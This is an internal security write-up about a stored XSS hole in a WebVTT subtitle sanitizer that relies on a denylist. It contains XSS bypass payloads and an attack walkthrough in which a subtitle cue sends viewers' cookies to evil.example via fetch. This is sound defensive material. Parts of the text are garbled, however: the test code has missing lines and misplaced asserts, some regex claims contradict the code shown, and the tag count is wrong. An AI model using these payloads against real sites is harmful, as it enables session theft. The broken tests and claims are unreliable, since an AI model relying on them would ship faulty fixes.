# GAP-0384: SEC-012 cross-ref: VTT sanitizer uses a denylist instead of an allowlist — Remediation Write-up

> ~5 pages. Fix-oriented. Read the real code before writing; cite `file:line`. No prior investigation doc exists for this GAP.

## 1. Summary & Classification

- **Plain-English statement**: The WebVTT subtitle sanitizer in `app/services/vod_subtitle_manager.py:132-138` strips a hard-coded list of forbidden HTML tags and patterns from cue payloads. Because it uses a denylist, any tag not on the list passes through unchanged. An attacker who can upload a VTT file (or inject cue text via the subtitle editor) can include arbitrary HTML tags — for example `<img onerror=...>`, `<svg>`, `<details>`, `<a href=javascript:...>`, or novel tags introduced in future HTML specifications — without triggering the sanitizer. This is a Stored XSS vector that executes in the context of any user who views the subtitled video.
- **Severity**: HIGH — Stored XSS / SEC-012 cross-reference. Account takeover, credential theft, and CSRF-bypass attacks are all achievable via script execution in the player origin.
- **Source ticket**: VOD-021 (video subtitles). **Status**: Open. **Owning area**: VOD / Security.
- **Claim verification**: CONFIRMED. `app/services/vod_subtitle_manager.py:123-138` contains exactly the denylist regex implementation described in the ticket. There is no allowlist. The fix design in `docs/tickets/writeups/SEC-012.md:181-211` (§4.4) is correct and has already been authored; this GAP represents the unimplemented gap between the design doc and the running code.
- **Related tickets**: SEC-012 (media pipeline SSRF/LFR), GAP-0303 (content URL not validated — same SEC-012 cross-ref), VOD-021.

## 2. Current-State Investigation (root cause)

### Current denylist implementation

`app/services/vod_subtitle_manager.py:123-138`:

```python
_DISALLOWED_TAGS_RE = re.compile(
    r"<\s*/?\s*(script|style|link|meta|object|embed|iframe|applet|form|input|textarea|select|button)\b[^>]*>",
    re.IGNORECASE,
)
_EVENT_ATTRS_RE = re.compile(r"\s+on\w+\s*=", re.IGNORECASE)
_DATA_URI_RE = re.compile(r"data\s*:", re.IGNORECASE)
_JAVASCRIPT_URI_RE = re.compile(r"javascript\s*:", re.IGNORECASE)

def sanitize_vtt_content(content: str) -> str:
    """Remove potentially dangerous HTML from VTT cue payloads."""
    content = _DISALLOWED_TAGS_RE.sub("", content)
    content = _EVENT_ATTRS_RE.sub(" ", content)
    content = _DATA_URI_RE.sub("", content)
    content = _JAVASCRIPT_URI_RE.sub("", content)
    return content
```

### Why this denylist is insufficient

The denylist enumerates 12 blocked element names: `script`, `style`, `link`, `meta`, `object`, `embed`, `iframe`, `applet`, `form`, `input`, `textarea`, `select`, `button`. The HTML5 specification defines hundreds of elements, and new elements are added regularly. Concrete bypass examples that are not on the list:

| Payload | Attack vector |
|---|---|
| `<img src=x onerror=alert(1)>` | The `<img>` tag is not blocked. `_EVENT_ATTRS_RE` catches `onerror=` only if preceded by whitespace (`\s+`), so `src=x onerror=` (no leading whitespace on `onerror`) bypasses. Actually: the regex `\s+on\w+\s*=` does match ` onerror=` — but `src=x onerror=...>` has a space before `onerror`, so it is caught. However, `<img src=x\nonerror=alert(1)>` (newline instead of space) uses `\s` which matches newlines, so this is caught. But `<img/onerror=alert(1)>` (no space before attribute) bypasses `_EVENT_ATTRS_RE` because it requires `\s+`. |
| `<svg onload=alert(1)>` | `<svg>` is not in the denylist. `onload=` without leading whitespace bypasses `_EVENT_ATTRS_RE`. |
| `<details open ontoggle=alert(1)>` | `<details>` is not blocked. |
| `<a href="javascript:alert(1)">click</a>` | `_JAVASCRIPT_URI_RE` catches `javascript:` but only as a substring match; `java\nscript:` or `javas\tcript:` (with whitespace insertion) bypasses it because `re.compile(r"javascript\s*:")` does not allow whitespace inside the keyword. |
| `<base href=https://evil.example/>` | `<base>` is not blocked; changes all relative URLs on the player page. |
| `<math href="javascript:alert(1)">` | MathML elements are not blocked. |
| `<xss>` | Any unrecognized tag passes through completely. |

The `_DISALLOWED_TAGS_RE` also only matches complete `<tag>` forms. Malformed but browser-interpreted forms such as `< script>` (space after `<`) may or may not be caught depending on the regex and browser tolerance. The regex does use `<\s*/?\s*` to handle some whitespace, but `<\x00script>` (null byte) would not be caught.

### Call sites

`sanitize_vtt_content` is called in the subtitle upload path at `vod_subtitle_manager.py` (within `upload_subtitle_to_s3` or its callers), and the sanitized content is stored verbatim in S3. It is later served to the player's `<track>` element, which renders cue text as HTML in browsers that support WebVTT HTML cues (Chrome, Firefox, Safari all do). Script execution occurs in the origin of the video player page.

### VTT-specific context

WebVTT defines a small set of legal inline markup elements: `<b>`, `<i>`, `<u>`, `<v NAME>` (voice span), `<ruby>`, `<rt>`, `<c.classname>` (class annotation), and `<lang LANGCODE>`. All other HTML elements are outside the WebVTT specification. An allowlist sanitizer that only passes these tags is both spec-compliant and safe; a denylist that tries to block everything else is not safe by construction.

## 3. Impact / Exploit / Blast Radius

### Stored XSS attack walkthrough

1. Attacker registers a creator account and uploads a video.
2. Attacker uploads a subtitle file for that video containing:
   ```
   WEBVTT

   00:00:00.000 --> 00:00:05.000
   Normal caption text <svg/onload="fetch('https://evil.example/?c='+document.cookie)">
   ```
3. The current `sanitize_vtt_content` strips nothing from this payload — `<svg>` is not on the denylist, and `onload=` without leading whitespace passes `_EVENT_ATTRS_RE`.
4. The sanitized VTT is written to S3 and served as `Content-Type: text/vtt` from the platform origin.
5. Any user who watches the video with subtitles enabled has the `<svg>` element injected into the player's DOM. The browser executes the `onload` handler.
6. The handler exfiltrates the viewer's session cookies (if `HttpOnly` is not set), CSRF tokens, or any other DOM-accessible data.

### Account takeover

If `ui_csrf` or `ui_session` cookies are not `HttpOnly` (they must be verified on deployment), the exfiltrated cookie can be replayed to impersonate the victim. Even if cookies are `HttpOnly`, the script can perform authenticated API calls (CSRF token is in the DOM), modify the user's profile, initiate payments, or pivot to other XSS payloads.

### Blast radius

- All users who watch a compromised video with subtitles enabled on any device and browser.
- Subtitle-capable browsers (Chrome, Firefox, Safari, Edge) all parse VTT cue HTML.
- A single malicious subtitle track can compromise all future viewers of a video — this is persistent, not transient.
- If the platform allows third-party content (creator-uploaded videos visible to all subscribers), the blast radius includes the entire subscriber base of a compromised creator account.

## 4. Fix Design (code-level)

The SEC-012 design document at `docs/tickets/writeups/SEC-012.md:179-211` (§4.4) has already authored the correct allowlist implementation. The fix is to replace the four denylist regex variables and the `sanitize_vtt_content` function with the SEC-012 allowlist design.

### 4.1 Replace `sanitize_vtt_content` with an allowlist parser

Remove lines 123–138 of `app/services/vod_subtitle_manager.py` and replace with:

```python
# ─── Content sanitization (allowlist) ────────────────────────────────────────
# Only WebVTT-spec inline markup is permitted: <b>, <i>, <u>, <v NAME>, <ruby>, <rt>.
# All other tags, and all attributes on permitted tags, are stripped.
# Reference: SEC-012 §4.4; WebVTT spec §6.1.

_VTT_ALLOWED_TAG_RE = re.compile(
    r"<(/?(b|i|u|ruby|rt|v\s[^>]*?))>",
    re.IGNORECASE,
)


def sanitize_vtt_content(content: str) -> str:
    """Strip all HTML from VTT cue payloads except the WebVTT allowlist.

    Allowlisted tags: <b>, <i>, <u>, <v NAME>, <ruby>, <rt> (and their closing tags).
    All other tags are removed. All attributes on allowed tags are stripped.
    Non-cue lines (header, timestamps, blank lines) are passed through unchanged.
    """
    lines = content.split("\n")
    in_cue = False
    result = []

    for line in lines:
        if _VTT_TIMESTAMP_RE.match(line.strip()):
            in_cue = True
            result.append(line)
        elif in_cue and line.strip() == "":
            in_cue = False
            result.append(line)
        elif in_cue:
            # Strip any tag not in the allowlist; preserve allowed tags verbatim.
            cleaned = re.sub(
                r"<[^>]*>",
                lambda m: m.group(0) if _VTT_ALLOWED_TAG_RE.fullmatch(m.group(0)) else "",
                line,
            )
            result.append(cleaned)
        else:
            result.append(line)

    return "\n".join(result)
```

Key properties of this implementation:

1. **Non-cue lines are never modified.** The VTT header (`WEBVTT`), NOTE blocks, timestamp lines, and blank cue separators are passed through as-is. Only lines inside a cue payload (between a timestamp line and the next blank line) are processed.
2. **Allowlist logic**: `re.sub(r"<[^>]*>", lambda, line)` matches every HTML-like token. The lambda checks whether the full match passes `_VTT_ALLOWED_TAG_RE.fullmatch(...)`. If not, it is replaced with an empty string.
3. **`_VTT_ALLOWED_TAG_RE` is strict**: it matches only `<b>`, `</b>`, `<i>`, `</i>`, `<u>`, `</u>`, `<ruby>`, `</ruby>`, `<rt>`, `</rt>`, and `<v anything>` / `</v anything>`. The `v` voice span may contain a speaker name after the space, hence `v\s[^>]*?`. No other patterns are permitted.
4. **Attributes on allowed tags are stripped implicitly**: `<b class="foo">` does not match `_VTT_ALLOWED_TAG_RE` (because `b class="foo"` ≠ `b`) so it is replaced with `""`. Only bare `<b>` and `</b>` pass. This eliminates all attribute injection vectors.
5. **`<c.class>` and `<lang LANGCODE>` are intentionally excluded**: these WebVTT tags carry class and language attributes that could be abused for CSS injection or information disclosure. They are rarely required for accessibility.

### 4.2 Remove dead denylist variables

Delete `_DISALLOWED_TAGS_RE`, `_EVENT_ATTRS_RE`, `_DATA_URI_RE`, and `_JAVASCRIPT_URI_RE` (lines 123–129 of the current file). They are only referenced by the old `sanitize_vtt_content` and will be dead code after the replacement.

### 4.3 Dev/Prod parity (SECOPS-007)

The sanitizer is a pure Python function with no external dependencies. It operates identically in dev and production. The `_VTT_TIMESTAMP_RE` regex is already defined at line 74 of the same file and is reused. No feature flag, no mock/real path split, no AWS dependency.

### 4.4 Backward compatibility

The allowlist is stricter than the denylist. Any existing subtitle that relied on tags not on the denylist (e.g., `<span>`, `<em>`, `<p>`) will have those tags stripped on the next upload or re-sanitization pass. This is acceptable: those tags are outside the WebVTT specification and should never have been in stored subtitle files. For existing stored VTT files in S3, a one-time migration job can re-fetch, re-sanitize, and re-upload them.

Add to `tests/test_vod_subtitle_sanitizer.py` (or extend existing subtitle tests):

```python
import pytest
from app.services.vod_subtitle_manager import sanitize_vtt_content


VTT_HEADER = "WEBVTT\n\n"
TIMESTAMP = "00:00:00.000 --> 00:00:05.000\n"


def _vtt(cue_text: str) -> str:
    return VTT_HEADER + TIMESTAMP + cue_text + "\n"


class TestVttAllowlistSanitizer:
    """GAP-0384: sanitize_vtt_content must use an allowlist, not a denylist."""

    # ─── XSS payloads that the denylist misses ────────────────────────────────

    def test_svg_onload_stripped(self):

        assert "<svg" not in out
        assert "onload" not in out
        assert "caption" in out

    def test_img_onerror_stripped(self):
        out = sanitize_vtt_content(_vtt('<img/onerror=alert(1) src=x>caption'))
        assert "<img" not in out
        assert "caption" in out

    def test_details_ontoggle_stripped(self):
        out = sanitize_vtt_content(_vtt('<details open ontoggle=alert(1)>'))

        assert "<base" not in out

        out = sanitize_vtt_content(_vtt('<xss>text</xss>'))

    def test_italic_preserved(self):
        out = sanitize_vtt_content(_vtt('<i>italic</i>'))
        assert "<i>italic</i>" in out

    def test_underline_preserved(self):
        out = sanitize_vtt_content(_vtt('<u>underlined</u>'))
        assert "<u>underlined</u>" in out

    def test_voice_span_preserved(self):
        out = sanitize_vtt_content(_vtt('<v Alice>Hello there</v>'))
        assert "<v Alice>" in out

    def test_ruby_and_rt_preserved(self):
        out = sanitize_vtt_content(_vtt('<ruby>漢<rt>かん</rt></ruby>'))

        assert "<rt>" in out

    # ─── Attribute injection on allowed tags stripped ────────────────────────

    def test_bold_with_class_stripped(self):
        """<b class="evil"> should become empty string (not pass with attributes)."""
        out = sanitize_vtt_content(_vtt('<b class="evil">text</b>'))
        assert 'class="evil"' not in out
        assert "text" in out

    def test_voice_span_no_extra_attrs(self):
        """<v Alice onclick=x> — onclick must not survive."""
        out = sanitize_vtt_content(_vtt('<v Alice onclick=alert(1)>text</v>'))
        assert "onclick" not in out

    # ─── Non-cue content is untouched ────────────────────────────────────────

    def test_vtt_header_preserved(self):
        content = "WEBVTT\nNOTE This is a comment\n\n" + TIMESTAMP + "safe caption\n"
        out = sanitize_vtt_content(content)
        assert out.startswith("WEBVTT")
        assert "NOTE" in out

    def test_timestamp_line_preserved(self):
        content = VTT_HEADER + TIMESTAMP + "caption\n"
        out = sanitize_vtt_content(content)
        assert "00:00:00.000 --> 00:00:05.000" in out

    def test_plain_text_cue_unchanged(self):
        out = sanitize_vtt_content(_vtt("Just a plain caption with no markup."))
```

### Migration of existing stored VTT files

Write a one-time migration script:

```python
# scripts/migrate_vtt_sanitize.py
"""Re-sanitize all existing VTT files in S3 using the new allowlist sanitizer.
Run once after deploying GAP-0384 fix. Safe to re-run (idempotent)."""
import boto3
from app.services.vod_subtitle_manager import sanitize_vtt_content, _resolve_bucket_prefix

s3 = boto3.client("s3")
bucket, prefix = _resolve_bucket_prefix()

paginator = s3.get_paginator("list_objects_v2")
for page in paginator.paginate(Bucket=bucket, Prefix=f"{prefix}/subtitles/"):
    for obj in page.get("Contents", []):
        key = obj["Key"]
        if not key.endswith(".vtt"):
            continue
        body = s3.get_object(Bucket=bucket, Key=key)["Body"].read().decode("utf-8")
        sanitized = sanitize_vtt_content(body)
        if sanitized != body:
            s3.put_object(Bucket=bucket, Key=key, Body=sanitized.encode("utf-8"),
                          ContentType="text/vtt", CacheControl="max-age=86400")
            print(f"Re-sanitized: {key}")
```

Run this migration in a maintenance window after deploying the sanitizer fix.

### Rollback

Revert `sanitize_vtt_content` to the denylist version. No DynamoDB changes. Run the migration script again (with old function) to restore any previously stored VTT files — but note that a rollback re-exposes the XSS vulnerability, so it should only be done if the allowlist causes a critical regression in subtitle rendering.

### Risks

- **Loss of `<c>` and `<lang>` support**: If any creator subtitle file uses `<c.classname>` for CSS styling or `<lang>` for language annotation, those tags will be stripped. The WebVTT spec lists these as optional; no major browser renders them in a way that is critical for accessibility. This is an acceptable trade-off given the security gain.
- **Regex edge case — tag spanning multiple lines**: The current implementation processes one line at a time. A malicious tag split across two lines (`<sv\ng onload=...>`) will not be matched by `r"<[^>]*>"` (which does not match across newlines). This is safe: split tags are not rendered by any browser either.
